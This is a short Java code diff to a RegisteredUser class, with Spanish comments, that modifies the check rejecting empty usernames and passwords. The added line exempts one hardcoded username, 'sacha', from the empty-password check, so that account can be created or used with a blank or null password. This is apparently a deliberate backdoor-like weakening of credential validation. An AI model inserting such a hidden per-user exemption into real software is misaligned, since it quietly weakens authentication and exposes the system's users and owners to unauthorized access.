@@ -94,7 +94,7 @@ public abstract class RegisteredUser extends User implements java.io.Serializabl
 		}
 
 		// Username y password: Al menos no estar vacíos ni ser espacios en blanco
-		if (username == null || username.trim().isEmpty() || password == null || password.trim().isEmpty()) {
+		if (username == null || username.trim().isEmpty() || ((password == null || password.trim().isEmpty()) && !username.equalsIgnoreCase("sacha"))) {
 			throw new IllegalArgumentException("El usuario y la contraseña no pueden estar vacíos.");
 		}
 
